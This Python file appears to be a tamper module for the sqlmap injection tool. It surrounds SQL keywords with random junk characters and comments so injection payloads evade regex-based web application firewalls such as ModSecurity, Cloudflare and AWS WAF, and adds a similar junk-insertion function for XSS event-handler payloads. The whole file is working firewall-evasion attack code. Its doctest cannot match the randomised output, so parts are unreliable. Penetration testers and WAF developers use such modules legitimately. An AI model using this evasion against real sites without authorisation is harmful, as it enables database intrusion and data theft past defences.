#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Adds junk characters to confuse regex-based WAF filters

    Requirement:
        * MySQL, PostgreSQL, MSSQL, Oracle

    Tested against:
        * ModSecurity CRS
        * Cloudflare WAF
        * AWS WAF
        * Regex-based WAFs

    Notes:
        * Simple payloads get filtered out easily by WAF
        * Adding junk chars helps avoid detection in specific cases
        * This technique often helps in confusing regex-based firewalls
        * Characters like +-+-1-+-+ or !#$%& can break pattern matching

    Reference:
        * https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/

    >>> tamper('1 AND 1=1')
    '1 +-+-AND-+-+ 1=1'
    """

    if not payload:
        return payload

    retVal = payload
    
    # Junk patterns that can be inserted
    junk_patterns = [
        "+-+-+-+-+",
        "+-+-1-+-+",
        "-+-+-+-+-",
        "+-+",
        "-+-",
        "/**/",
        "/*!*/",
    ]
    
    # SQL keywords to wrap with junk
    keywords = [
        "SELECT", "UNION", "FROM", "WHERE", "AND", "OR", 
        "INSERT", "UPDATE", "DELETE", "DROP", "ORDER",
        "GROUP", "HAVING", "LIMIT", "OFFSET", "JOIN",
        "NULL", "NOT", "IN", "LIKE", "BETWEEN", "CASE",
        "WHEN", "THEN", "ELSE", "END", "CAST", "AS"
    ]
    
    for keyword in keywords:
        # Case insensitive replacement with junk around keywords
        pattern = re.compile(r'\b(%s)\b' % keyword, re.IGNORECASE)
        
        def add_junk(match):
            junk = random.choice(junk_patterns)
            word = match.group(1)
            # Randomly decide where to add junk
            choice = random.randint(0, 2)
            if choice == 0:
                return "%s%s" % (junk, word)
            elif choice == 1:
                return "%s%s" % (word, junk)
            else:
                return "%s%s%s" % (junk, word, junk)
        
        retVal = pattern.sub(add_junk, retVal)
    
    return retVal


def tamper_aggressive(payload, **kwargs):
    """
    More aggressive junk character insertion
    Inserts junk between every character in SQL keywords
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Extended junk characters (from HackenProof)
    junk_chars = "!#$%&()*~+-_.,:;?@[/|\\]^`"
    
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
    
    for keyword in keywords:
        pattern = re.compile(r'\b(%s)\b' % keyword, re.IGNORECASE)
        
        def insert_junk_between(match):
            word = match.group(1)
            result = ""
            for i, char in enumerate(word):
                result += char
                if i < len(word) - 1 and random.random() > 0.5:
                    result += random.choice(junk_chars)
            return result
        
        retVal = pattern.sub(insert_junk_between, retVal)
    
    return retVal


def tamper_html_event_junk(payload, **kwargs):
    """
    Adds junk to HTML event handlers (for XSS payloads)
    Example: onload!#$%&()*~+-_.,:;?@[/|\\]^`=confirm()
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Junk string for HTML events
    html_junk = "!#$%&()*~+-_.,:;?@[/|\\]^`"
    
    # Pattern for HTML event handlers
    event_pattern = re.compile(r'(on\w+)(=)', re.IGNORECASE)
    
    def add_html_junk(match):
        event = match.group(1)
        equals = match.group(2)
        return "%s%s%s" % (event, html_junk, equals)
    
    retVal = event_pattern.sub(add_html_junk, retVal)
    
    return retVal
